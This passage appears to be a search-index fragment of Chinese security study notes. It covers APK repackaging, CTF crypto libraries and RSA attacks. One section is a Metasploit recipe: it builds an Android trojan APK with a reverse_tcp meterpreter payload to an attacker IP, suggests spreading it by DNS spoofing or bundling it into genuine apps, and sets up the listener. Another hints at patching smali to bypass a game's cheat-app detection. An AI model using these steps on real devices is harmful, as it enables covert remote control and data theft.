\uff0c\u90e8\u5206 APP \u5bf9\u8fdb\u884c\u7b7e\u540d\u6821\u9a8c\u3002\u4ee5\u4e0b\u8bb0\u5f55\u90fd\u662f\u4ee5\u8fd9\u4e2a\u7ec3\u624b apk \u8bb0\u5f55\u7684\u57fa\u7840\u6b65\u9aa4\u3002(\u5bc6\u7801:8was) \u4fee\u6539\u5305\u540d \u00b6 \u53cd\u7f16\u8bd1 APK \u83b7\u53d6\u5305\u540d \u00b6 \u53ef\u4ee5\u7528 apktool \u4e5f\u53ef\u4ee5\u7528 apkkiller\uff08\u540e\u9762\u7b80\u79f0AK\uff09 \u53cd\u7f16\u8bd1 apk \uff0c\u5728\u6587\u4ef6\u5939\u4e0b\u627e\u5230 AndroidManifest.xml \u3002 \u4e00\u822c\u5728 xml \u7684\u5934\u90e8\u80fd\u627e\u5230\uff1a package=\"app.skyenews.jy\" \u3002 app.skyenews.jy \u5c31\u662f\u539f\u59cb\u5305\u540d\u3002 \u66f4\u6539\u5305\u540d \u00b6 \u539f\u59cb\u5305\u540d\uff1a app.skyenews.jy \u76ee\u6807\u5305\u540d\uff1a app.skyenews.jy123 \u9996\u5148\u6539\u76f8\u5173\u8d44\u6e90\u7684\u8def\u5f84\uff0c\u5c31\u662f xml \u91cc\u9762\u7684 activity \u7684\u8def\u5f84\uff1b\u5728\u8fd9\u4e00\u6b65\u4e5f\u540c\u65f6\u4fee\u6539\u4e86 xml \u7684 provider\uff08\u5185\u5bb9\u63d0\u4f9b\u8005\uff09\u5c5e\u6027\u3002 \u5728 AK \u64cd\u4f5c\u7684\u8bdd\uff0c\u641c\u7d22\u5b57\u7b26\uff1a app.skyenews.jy \uff0c\u66ff\u6362\u5b57\u7b26\uff1a app.skyenews.jy123 \uff0c\u641c\u7d22\u8303\u56f4\uff1a\u5f53\u524d\u6574\u4e2a\u9879\u76ee\uff0c\u5148\u6309\u641c\u7d22\u518d\u6309\u5168\u90e8\u66ff\u6362\u3002 \u7136\u540e\u5c31\u662f\u66ff\u6362 smail \u4ee3\u7801\u7b49\u91cc\u9762\u7684\u8def\u5f84\u3002\u641c\u7d22\u5b57\u7b26\uff1a app/skyenews/jy \uff0c\u66ff\u6362\u5b57\u7b26\uff1a app/skyenews/jy123 \uff0c\u641c\u7d22\u8303\u56f4\uff1a\u5f53\u524d\u6574\u4e2a\u9879\u76ee\uff0c\u5148\u6309\u641c\u7d22\u518d\u6309\u5168\u90e8\u66ff\u6362\u3002 \u56de\u7f16\u8bd1 \u00b6 \u66ff\u6362\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u56de\u7f16\u8bd1 apk \uff0c\u5b89\u88c5\u5373\u53ef\u3002 \u4e24\u4e2a apk \u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\uff1a \u5f53\u4f60\u4e86\u89e3\u5e76\u5b66\u4e60\u5b8c\u4fee\u6539\u5305\u540d\u7684\u64cd\u4f5c\u540e\uff0c\u81ea\u5df1\u4fee\u6539\u5176\u4ed6 apk \u5305\u540d\u65f6\uff0c\u6709\u53ef\u80fd\u9047\u5230\u5305\u540d\u68c0\u6d4b\u7b49\u9519\u8bef\u800c\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u4fee\u6539\u7248\u7684 apk \uff0c\u8bf7\u5584\u7528 debug \u3002\u6bd4\u5982\u9047\u5230\u5305\u540d\u68c0\u6d4b\uff0c\u53ef\u4ee5\u8bd5\u7740\u627e\u5230\u5305\u540d\u68c0\u6d4b\u7684 smail \u4ee3\u7801\uff0c\u4fee\u6539\u8df3\u8f6c\u6761\u4ef6\u7b49\u64cd\u4f5c\u3002 \u4fee\u6539\u540d\u79f0 \u00b6 \u7b2c\u4e00\u6b65\u8fd8\u662f\u5148\u53cd\u7f16\u8bd1\u3002 \u5728 AK \u4e2d\u641c\u7d22\u5b57\u7b26\uff1a app_name \u6216 label \uff0c\u641c\u7d22\u8303\u56f4\uff1a\u5f53\u524d\u6574\u4e2a\u9879\u76ee\u3002\u5982\u679c\u51fa\u73b0\u591a\u4e2a\u641c\u7d22\u7ed3\u679c\uff0c\u771f\u6b63\u5b58\u653e\u7684\u5730\u65b9\u4e00\u822c\u662f\u5728 strings.xml \u6216 AndroidManifest.xml \u3002\u4fee\u6539\u65e0\u6548\u7684\u53ef\u4ee5\u8003\u8651\u76f4\u63a5\u641c\u7d22 app \u540d\u79f0\uff0c\u901a\u5e38\u662f\u660e\u6587\u5b58\u50a8\u6216\u662f unicode \u7f16\u7801\u5b58\u50a8\u3002 \u5b58\u50a8\u5728 strings.xml \u7684\u4f8b\u5b50\uff1a \u660e\u6587\u5b58\u50a8\u5728 AndroidManifest.xml \u7684\u4f8b\u5b50\uff1a\uff08main activity \u4e2d\u7684 label \u5c5e\u6027\u53ef\u4f5c\u4e3a APP \u7684\u540d\u79f0\uff09 \u4fee\u6539\u56fe\u6807 \u00b6 \u7b2c\u4e00\u6b65\u8fd8\u662f\u5148\u53cd\u7f16\u8bd1\u3002 \u627e\u5230\u6839\u76ee\u5f55\u7684 AndroidManifest.xml \uff0c\u7136\u540e\u627e application \u6807\u7b7e\u3002\u6807\u7b7e\u5185\u7684 android:icon=\"@mipmap/launcher_icon\" \u5c31\u662f\u7ba1\u56fe\u6807\u7684\uff0c\u5176\u4e2d\uff1a @mipmap/launcher_icon \u662f\u56fe\u6807\u7684\u8def\u5f84\uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f res/mipap-xxxx/launcher_icon.png \u3002\u5176\u4e2d xxxx \u662f\u5bf9\u5e94\u5404\u4e2a\u5206\u8fa8\u7387\u7684\u6587\u4ef6\u5939\uff0c\u8fd0\u884c\u4f1a\u6839\u636e\u624b\u673a\u5206\u8fa8\u7387\u4e0d\u540c\uff0c\u81ea\u52a8\u53bb\u62ff\u5bf9\u5e94\u5206\u8fa8\u7387\u7684\u3002 \u5047\u8bbe\u4fee\u6539\u4e3a res/drawable/abc_ic_menu_paste_mtrl_am_alpha.png \uff0c\u5c31\u5e94\u8be5\u4fee\u6539\u5c5e\u6027\u4e3a\uff1a android:icon=\"@drawable/abc_ic_menu_paste_mtrl_am_alpha\" \u7ec3\u4e60\u8d44\u6e90 \u00b6 \u84dd\u594f\u4e91 \u5bc6\u7801\uff08\u8bf7\u4f7f\u7528base64\u89e3\u5bc6\uff09:OHdhcw==","title":"Apk\u4fee\u6539\u5305\u540d\u3001\u540d\u79f0\u3001\u56fe\u6807"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_1","text":"\u4e0d\u4e3a\u4eba\u77e5\u7684\u67d0\u6e38\u620f APP \u4f1a\u5bf9\u624b\u673a\u68c0\u67e5\u662f\u5426\u6709\u4f5c\u5f0a APP \uff0c\u4e5f\u5c31\u662f\u68c0\u6d4b\u624b\u673a\u4e0a APP \u7684\u5305\u540d\u561b\u3002\u5728\u5176\u6b21 wx \u6ca1\u6709\u7c7b\u4f3c qq \u7684\u5173\u8054\u529f\u80fd\uff0c\u53cc\u53f7\u7528\u6237\u5dee\u8bc4\u3002 \u56e0\u4e3a\u8fdb\u884c\u4e86\u53cd\u7f16\u8bd1\u548c\u56de\u7f16\u8bd1\uff0c\u6240\u4ee5 apk \u7b7e\u540d\u4f1a\u6539\u53d8 \uff0c\u90e8\u5206 APP \u5bf9\u8fdb\u884c\u7b7e\u540d\u6821\u9a8c\u3002\u4ee5\u4e0b\u8bb0\u5f55\u90fd\u662f\u4ee5\u8fd9\u4e2a\u7ec3\u624b apk \u8bb0\u5f55\u7684\u57fa\u7840\u6b65\u9aa4\u3002(\u5bc6\u7801:8was)","title":"\u524d\u8a00"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_2","text":"","title":"\u4fee\u6539\u5305\u540d"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#apk","text":"\u53ef\u4ee5\u7528 apktool \u4e5f\u53ef\u4ee5\u7528 apkkiller\uff08\u540e\u9762\u7b80\u79f0AK\uff09 \u53cd\u7f16\u8bd1 apk \uff0c\u5728\u6587\u4ef6\u5939\u4e0b\u627e\u5230 AndroidManifest.xml \u3002 \u4e00\u822c\u5728 xml \u7684\u5934\u90e8\u80fd\u627e\u5230\uff1a package=\"app.skyenews.jy\" \u3002 app.skyenews.jy \u5c31\u662f\u539f\u59cb\u5305\u540d\u3002","title":"\u53cd\u7f16\u8bd1 APK \u83b7\u53d6\u5305\u540d"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_3","text":"\u539f\u59cb\u5305\u540d\uff1a app.skyenews.jy \u76ee\u6807\u5305\u540d\uff1a app.skyenews.jy123 \u9996\u5148\u6539\u76f8\u5173\u8d44\u6e90\u7684\u8def\u5f84\uff0c\u5c31\u662f xml \u91cc\u9762\u7684 activity \u7684\u8def\u5f84\uff1b\u5728\u8fd9\u4e00\u6b65\u4e5f\u540c\u65f6\u4fee\u6539\u4e86 xml \u7684 provider\uff08\u5185\u5bb9\u63d0\u4f9b\u8005\uff09\u5c5e\u6027\u3002 \u5728 AK \u64cd\u4f5c\u7684\u8bdd\uff0c\u641c\u7d22\u5b57\u7b26\uff1a app.skyenews.jy \uff0c\u66ff\u6362\u5b57\u7b26\uff1a app.skyenews.jy123 \uff0c\u641c\u7d22\u8303\u56f4\uff1a\u5f53\u524d\u6574\u4e2a\u9879\u76ee\uff0c\u5148\u6309\u641c\u7d22\u518d\u6309\u5168\u90e8\u66ff\u6362\u3002 \u7136\u540e\u5c31\u662f\u66ff\u6362 smail \u4ee3\u7801\u7b49\u91cc\u9762\u7684\u8def\u5f84\u3002\u641c\u7d22\u5b57\u7b26\uff1a app/skyenews/jy \uff0c\u66ff\u6362\u5b57\u7b26\uff1a app/skyenews/jy123 \uff0c\u641c\u7d22\u8303\u56f4\uff1a\u5f53\u524d\u6574\u4e2a\u9879\u76ee\uff0c\u5148\u6309\u641c\u7d22\u518d\u6309\u5168\u90e8\u66ff\u6362\u3002","title":"\u66f4\u6539\u5305\u540d"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_4","text":"\u66ff\u6362\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u56de\u7f16\u8bd1 apk \uff0c\u5b89\u88c5\u5373\u53ef\u3002 \u4e24\u4e2a apk \u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\uff1a \u5f53\u4f60\u4e86\u89e3\u5e76\u5b66\u4e60\u5b8c\u4fee\u6539\u5305\u540d\u7684\u64cd\u4f5c\u540e\uff0c\u81ea\u5df1\u4fee\u6539\u5176\u4ed6 apk \u5305\u540d\u65f6\uff0c\u6709\u53ef\u80fd\u9047\u5230\u5305\u540d\u68c0\u6d4b\u7b49\u9519\u8bef\u800c\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u4fee\u6539\u7248\u7684 apk \uff0c\u8bf7\u5584\u7528 debug \u3002\u6bd4\u5982\u9047\u5230\u5305\u540d\u68c0\u6d4b\uff0c\u53ef\u4ee5\u8bd5\u7740\u627e\u5230\u5305\u540d\u68c0\u6d4b\u7684 smail \u4ee3\u7801\uff0c\u4fee\u6539\u8df3\u8f6c\u6761\u4ef6\u7b49\u64cd\u4f5c\u3002","title":"\u56de\u7f16\u8bd1"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_5","text":"\u7b2c\u4e00\u6b65\u8fd8\u662f\u5148\u53cd\u7f16\u8bd1\u3002 \u5728 AK \u4e2d\u641c\u7d22\u5b57\u7b26\uff1a app_name \u6216 label \uff0c\u641c\u7d22\u8303\u56f4\uff1a\u5f53\u524d\u6574\u4e2a\u9879\u76ee\u3002\u5982\u679c\u51fa\u73b0\u591a\u4e2a\u641c\u7d22\u7ed3\u679c\uff0c\u771f\u6b63\u5b58\u653e\u7684\u5730\u65b9\u4e00\u822c\u662f\u5728 strings.xml \u6216 AndroidManifest.xml \u3002\u4fee\u6539\u65e0\u6548\u7684\u53ef\u4ee5\u8003\u8651\u76f4\u63a5\u641c\u7d22 app \u540d\u79f0\uff0c\u901a\u5e38\u662f\u660e\u6587\u5b58\u50a8\u6216\u662f unicode \u7f16\u7801\u5b58\u50a8\u3002 \u5b58\u50a8\u5728 strings.xml \u7684\u4f8b\u5b50\uff1a \u660e\u6587\u5b58\u50a8\u5728 AndroidManifest.xml \u7684\u4f8b\u5b50\uff1a\uff08main activity \u4e2d\u7684 label \u5c5e\u6027\u53ef\u4f5c\u4e3a APP \u7684\u540d\u79f0\uff09","title":"\u4fee\u6539\u540d\u79f0"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_6","text":"\u7b2c\u4e00\u6b65\u8fd8\u662f\u5148\u53cd\u7f16\u8bd1\u3002 \u627e\u5230\u6839\u76ee\u5f55\u7684 AndroidManifest.xml \uff0c\u7136\u540e\u627e application \u6807\u7b7e\u3002\u6807\u7b7e\u5185\u7684 android:icon=\"@mipmap/launcher_icon\" \u5c31\u662f\u7ba1\u56fe\u6807\u7684\uff0c\u5176\u4e2d\uff1a @mipmap/launcher_icon \u662f\u56fe\u6807\u7684\u8def\u5f84\uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f res/mipap-xxxx/launcher_icon.png \u3002\u5176\u4e2d xxxx \u662f\u5bf9\u5e94\u5404\u4e2a\u5206\u8fa8\u7387\u7684\u6587\u4ef6\u5939\uff0c\u8fd0\u884c\u4f1a\u6839\u636e\u624b\u673a\u5206\u8fa8\u7387\u4e0d\u540c\uff0c\u81ea\u52a8\u53bb\u62ff\u5bf9\u5e94\u5206\u8fa8\u7387\u7684\u3002 \u5047\u8bbe\u4fee\u6539\u4e3a res/drawable/abc_ic_menu_paste_mtrl_am_alpha.png \uff0c\u5c31\u5e94\u8be5\u4fee\u6539\u5c5e\u6027\u4e3a\uff1a android:icon=\"@drawable/abc_ic_menu_paste_mtrl_am_alpha\"","title":"\u4fee\u6539\u56fe\u6807"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/#_7","text":"\u84dd\u594f\u4e91 \u5bc6\u7801\uff08\u8bf7\u4f7f\u7528base64\u89e3\u5bc6\uff09:OHdhcw==","title":"\u7ec3\u4e60\u8d44\u6e90"},{"location":"Android/msf%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8Fapk%E6%94%BB%E5%87%BB/","text":"msf \u751f\u6210\u6728\u9a6c apk \u5165\u4fb5\u5b89\u5353\u8bbe\u5907 \u00b6 \u751f\u6210\u6728\u9a6c \u00b6 \u65b0\u7248\u672c msf \uff1a msfvenom -p android/meterpreter/reverse_tcp LHOST = \u653b\u51fb\u8005ip LPORT = \u653b\u51fb\u8005\u76d1\u542c\u7aef\u53e3 R > /root/apk.apk \u8001\u7248\u672c msf \uff1a msfpayload -p android/meterpreter/reverse_tcp LHOST = \u653b\u51fb\u8005ip LPORT = \u653b\u51fb\u8005\u76d1\u542c\u7aef\u53e3 R > /root/apk.apk \u65b0\u7248\u672c\u751f\u6210\u7684 apk \u5df2\u7ecf\u7b7e\u540d\u53ef\u76f4\u63a5\u5b89\u88c5\u3002 \u4f20\u64ad\u6728\u9a6c \u00b6 \u5c40\u57df\u7f51\u7684\u8bdd\u53ef\u4ee5\u901a\u8fc7 dns \u6b3a\u9a97\u4e4b\u7c7b\u7684\u3002\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u6728\u9a6c\u5305\u542b\u5230\u5176\u4ed6\u6b63\u5e38 apk \u91cc\u9762\u3002 \u76d1\u542c \u00b6 msfconsole use exploit/multi/handler #\u52a0\u8f7d\u6a21\u5757 set payload android/meterpreter/reverse_tcp #\u9009\u62e9Payload show options #\u67e5\u770b\u53c2\u6570\u8bbe\u7f6e set LHOST 192 .168.x.x #\u653b\u51fb\u8005ip set LPORT xxxx #\u653b\u51fb\u8005\u76d1\u542c\u7aef\u53e3 exploit #\u5f00\u59cb\u76d1\u542c help \u67e5\u770b\u53ef\u8fdb\u884c\u64cd\u4f5c","title":"msf \u751f\u6210\u6728\u9a6c apk \u5165\u4fb5\u5b89\u5353\u8bbe\u5907"},{"location":"Android/msf%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8Fapk%E6%94%BB%E5%87%BB/#msf-apk","text":"","title":"msf \u751f\u6210\u6728\u9a6c apk \u5165\u4fb5\u5b89\u5353\u8bbe\u5907"},{"location":"Android/msf%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8Fapk%E6%94%BB%E5%87%BB/#_1","text":"\u65b0\u7248\u672c msf \uff1a msfvenom -p android/meterpreter/reverse_tcp LHOST = \u653b\u51fb\u8005ip LPORT = \u653b\u51fb\u8005\u76d1\u542c\u7aef\u53e3 R > /root/apk.apk \u8001\u7248\u672c msf \uff1a msfpayload -p android/meterpreter/reverse_tcp LHOST = \u653b\u51fb\u8005ip LPORT = \u653b\u51fb\u8005\u76d1\u542c\u7aef\u53e3 R > /root/apk.apk \u65b0\u7248\u672c\u751f\u6210\u7684 apk \u5df2\u7ecf\u7b7e\u540d\u53ef\u76f4\u63a5\u5b89\u88c5\u3002","title":"\u751f\u6210\u6728\u9a6c"},{"location":"Android/msf%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8Fapk%E6%94%BB%E5%87%BB/#_2","text":"\u5c40\u57df\u7f51\u7684\u8bdd\u53ef\u4ee5\u901a\u8fc7 dns \u6b3a\u9a97\u4e4b\u7c7b\u7684\u3002\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u6728\u9a6c\u5305\u542b\u5230\u5176\u4ed6\u6b63\u5e38 apk \u91cc\u9762\u3002","title":"\u4f20\u64ad\u6728\u9a6c"},{"location":"Android/msf%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8Fapk%E6%94%BB%E5%87%BB/#_3","text":"msfconsole use exploit/multi/handler #\u52a0\u8f7d\u6a21\u5757 set payload android/meterpreter/reverse_tcp #\u9009\u62e9Payload show options #\u67e5\u770b\u53c2\u6570\u8bbe\u7f6e set LHOST 192 .168.x.x #\u653b\u51fb\u8005ip set LPORT xxxx #\u653b\u51fb\u8005\u76d1\u542c\u7aef\u53e3 exploit #\u5f00\u59cb\u76d1\u542c help \u67e5\u770b\u53ef\u8fdb\u884c\u64cd\u4f5c","title":"\u76d1\u542c"},{"location":"Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/","text":"CTF\u5bc6\u7801\u5b66\u4e2dpython\u5e93\u5e94\u7528 \u00b6 Crypto \u00b6 \u53d6 100 bit \u957f\u7684\u968f\u673a\u8d28\u6570 from Crypto.Util.number import getPrime getPrime ( 100 ) bytes \u4e0e int \u4e92\u6362 from Crypto.Util.number import bytes_to_long , long_to_bytes bytes_to_long ( b 'this4bytes' ) long_to_bytes ( 123456789 ) \u6700\u5927\u516c\u7ea6\u6570 from Crypto.Util.number import GCD GCD ( 38 , 18 ) \u662f\u5426\u4e3a\u7d20\u6570 from Crypto.Util.number import isPrime () isPrime ( 17 ) gmpy2 \u00b6 gmpy2 \u5b89\u88c5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u51e0\u4e2a\u989d\u5916\u7684\u8fd0\u884c\u73af\u5883\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b Ubuntu \u6ca1\u6709\u3002\u8be6\u60c5\u8c37\u6b4c\u767e\u5ea6\u3002 \u521d\u59cb\u5316\u4e00\u4e2a\u5927\u6574\u6570 from gmpy2 import mpz mpz ( 0x10 ) mpz ( 1234 ) \u4e58\u6cd5\u9006\u5143 from gmpy2 import invert d = invert ( e , phi )","title":"CTF\u5bc6\u7801\u5b66\u4e2dpython\u5e93\u5e94\u7528"},{"location":"Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/#ctfpython","text":"","title":"CTF\u5bc6\u7801\u5b66\u4e2dpython\u5e93\u5e94\u7528"},{"location":"Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/#crypto","text":"\u53d6 100 bit \u957f\u7684\u968f\u673a\u8d28\u6570 from Crypto.Util.number import getPrime getPrime ( 100 ) bytes \u4e0e int \u4e92\u6362 from Crypto.Util.number import bytes_to_long , long_to_bytes bytes_to_long ( b 'this4bytes' ) long_to_bytes ( 123456789 ) \u6700\u5927\u516c\u7ea6\u6570 from Crypto.Util.number import GCD GCD ( 38 , 18 ) \u662f\u5426\u4e3a\u7d20\u6570 from Crypto.Util.number import isPrime () isPrime ( 17 )","title":"Crypto"},{"location":"Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/#gmpy2","text":"gmpy2 \u5b89\u88c5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u51e0\u4e2a\u989d\u5916\u7684\u8fd0\u884c\u73af\u5883\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b Ubuntu \u6ca1\u6709\u3002\u8be6\u60c5\u8c37\u6b4c\u767e\u5ea6\u3002 \u521d\u59cb\u5316\u4e00\u4e2a\u5927\u6574\u6570 from gmpy2 import mpz mpz ( 0x10 ) mpz ( 1234 ) \u4e58\u6cd5\u9006\u5143 from gmpy2 import invert d = invert ( e , phi )","title":"gmpy2"},{"location":"Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/","text":"RSA\u52a0\u5bc6\u7b14\u8bb0 \u00b6 \u6700\u540e\u66f4\u65b0\uff1a2020-03-02 11:23:12 1. RSA \u4ecb\u7ecd \u00b6 RSA \u7b97\u6cd5\u6d89\u53ca\u53c2\u6570\u6709\uff1a n\u3001e\u3001d\uff08p\u3001q\uff09 \uff0c\u5176\u4e2d\u5206\u4e3a\u79c1\u94a5\u548c\u516c\u94a5\u3002\u516c\u94a5\u4e3a\uff1a n\u3001e \uff0c\u79c1\u94a5\u4e3a\uff1a phi\u3001d \u3002\u6d89\u53ca\u6570\u5b66\u57fa\u7840\u6709\uff1a\u6b27\u62c9\u51fd\u6570\uff08phi\uff09\u3001\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff08gcd\uff09\u3001\u540c\u4f59\u3002 \u53c2\u6570\u4ecb\u7ecd \uff1a n \uff1a \u4e24\u4e2a\u7d20\u6570 p \u4e0e q \u7684\u4e58\u79ef\u3002\u6ce8\u610f\uff1an \u5c06\u516c\u5f00\uff0c\u800c p \u4e0e q \u4e0d\u516c\u5f00\u3002 e \uff1a\u4e00\u4e2a\u7d20\u6570\u3002\u6ee1\u8db3 1<e<phi \uff0c\u4e14 gcd(phi,e)=1 \uff08\u4e0e phi \u6700\u5927\u516c\u7ea6\u6570\u4e3a 1 \uff0c\u5373\u4e92\u7d20\uff09\u3002 phi \uff1a \u6b27\u62c9\u6570\uff0c\u8ba1\u7b97\u516c\u5f0f\uff1a phi = (p-1)(q-1) \u3002 d \uff1a e \u6a21 phi \u7684\u9006\u5143\uff0c\u5177\u4f53\u5173\u7cfb\u5f0f\uff1a d * e = 1 mod(phi) \u3002 2. \u52a0\u89e3\u5bc6\u7b97\u6cd5 \u00b6 c = m^e mod n = pow(m,e,n) m = c^d mod n = pow(c,d,n) 3. \u57fa\u7840\u52a0\u89e3\u5bc6\u811a\u672c \u00b6 \u52a0\u5bc6\u811a\u672c from Crypto.Util.number import * import gmpy2 msg = 'flag is :testflag' # \u660e\u6587 hex_msg = int ( msg . encode ( \"hex\" ), 16 ) # \u8f6c\u6362\u660e\u6587\u4e3a\u6570\u5b57 # \u751f\u6210\u516c\u94a5 n\u3001e p = getPrime ( 100 ) # \u968f\u673a\u751f\u6210\u4e00\u4e2a\u8d28\u6570 q = getPrime ( 100 ) n = p * q e = 0x10001 print ( \"n=\" , hex ( n )) print ( \"e=\" , hex ( e )) # \u751f\u6210\u79c1\u94a5 phi\u3001d phi = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phi ) # \u9006\u5143\u8fd0\u7b97 print ( \"phi=\" , hex ( phi )) print ( \"d=\" , hex ( d )) #\u52a0\u5bc6\u7b97\u6cd5 c = pow ( hex_msg , e , n ) print ( \"c=\" , hex ( c )) \u89e3\u5bc6\u811a\u672c # \u5df2\u77e5 c\u3001n\u3001e \uff0c\u5e76\u5206\u89e3n\u83b7\u5f97q\u3001p import gmpy2 c = 0x534280240c65bb1104ce3000bc8181363806e7173418d15762 e = 0x10001 n = 0x80b32f2ce68da974f25310a23144977d76732fa78fa29fdcbf # \u8fd9\u91cc\u4f7f\u7528yafu\u5206\u89e3n p = 780900790334269659443297956843 q = 1034526559407993507734818408829 # \u8ba1\u7b97\u79c1\u94a5 phi = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phi ) # \u89e3\u5bc6\u7b97\u6cd5 m = pow ( c , d , n ) print ( hex ( m )[ 2 :] . decode ( 'hex' )) # \u8f6c\u6362\u660e\u6587\u4e3a\u5b57\u7b26 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0cc e n phi p q c \u90fd\u662f int \u578b\uff0cm \u662f str \u578b\u3002\u6240\u4ee5\u9700\u8981\u5c06 m \u8f6c\u6362\u4e3a int \u578b\u5e26\u5165\u7b97\u6cd5\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\u3002 \u6211\u9047\u5230\u8fc7\u6709\u4e24\u79cd\u8f6c\u6362\u65b9\u5f0f\uff1a # \u65b9\u6cd5 1 msg = int ( msg . encode ( \"hex\" ), 16 ) msg = hex ( msg )[ 2 :] . decode ( 'hex' ) # \u65b9\u6cd5 2 from Crypto.Util.number import * bytes_to_long ( b 'felinae' ) # bytes \u8f6c int long_to_bytes ( 28821963924201829 ) # \u6570\u5b57\u8f6c bytes \u6c42\u9006\u5143 d \u7684\u8bdd\uff0c\u7528 gmpy2.invert \u4ee3\u5165\u53c2\u6570\u5373\u53ef\u3002\u53ea\u662f gmpy2 \u8fd9\u4e2a\u5e93\u6bd4\u8f83\u96be\u88c5\u3002 4. \u5e38\u89c1\u653b\u51fb\u65b9\u6cd5 \u00b6 4. 1 p \u4e0e q \u76f8\u5dee\u8fc7\u5927(\u5c0f) \u00b6 \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5229\u7528\u5de5\u5177\u7206\u7834\u51fa\u4e24\u4e2a\u5927\u8d28\u6570 p \u4e0e q \u3002\u901a\u5e38\u8ba4\u4e3a\u957f\u5ea6\u5728 256 bit \u4e00\u4ee5\u4e0b\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u5229\u7528\u5de5\u5177\u7206\u7834\uff1a yafu \u5206\u89e3 windows \u4e0b\u8f7d\u89e3\u538b\u5373\u7528\uff0c \u4e0b\u8f7d\u5730\u5740 \u957f\u5ea6\u5728 712 bit \u4ee5\u4e0b\u7684\uff0c\u53ef\u4ee5\u5230\u5728\u7ebf\u7f51\u7ad9\u67e5\u8be2\u4e00\u4e0b\u662f\u5426\u6709\u5df2\u7ecf\u89e3\u5bc6\u7684\u7ed3\u679c\uff1a \u5728\u7ebf\u7f51\u7ad9\u5206\u89e3 factordb 4.2 \u6709\u591a\u4e2a\u516c\u94a5 n \u4e14\u6709\u5171\u7528\u7d20\u6570\u56e0\u5b50 \u00b6 \u53ef\u4ee5\u5c1d\u8bd5**\u5229\u7528\u516c\u7ea6\u6570\u5206\u89e3 n ** \u5229\u7528**\u6b27\u51e0\u91cc\u5f97\u8f97\u8f6c\u76f8\u9664\u6cd5**\u6c42\u89e3\u6700\u5927\u516c\u7ea6\u6570\uff1a def gcd ( a , b ): if a < b : a , b = b , a while b != 0 : temp = a % b a = b b = temp return a def main (): a = 38 b = 18 print ( gcd ( a , b )) if __name__ == '__main__' : main () \u5229\u7528**Crypto.Util.number** \u5e93\uff1a from Crypto.Util.number import GCD GCD ( 38 , 18 ) 4.3 \u5171\u6a21\u653b\u51fb \u00b6 \u5982\u679c\u5728RSA\u7684\u4f7f\u7528\u4e2d\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u6a21n\u5bf9\u76f8\u540c\u7684\u660e\u6587m\u8fdb\u884c\u4e86\u52a0\u5bc6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728\u4e0d\u5206\u89e3n\uff0c\u4e5f\u4e0d\u9700\u8981\u6c42\u89e3\u79c1\u94a5\u7684\u60c5\u51b5\u4e0b\u8fd8\u539f\u51fa\u660e\u6587m\u7684\u503c\u3002\u5373\uff1a \u5f53n\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u77e5\u9053n,e1,e2,c1,c2 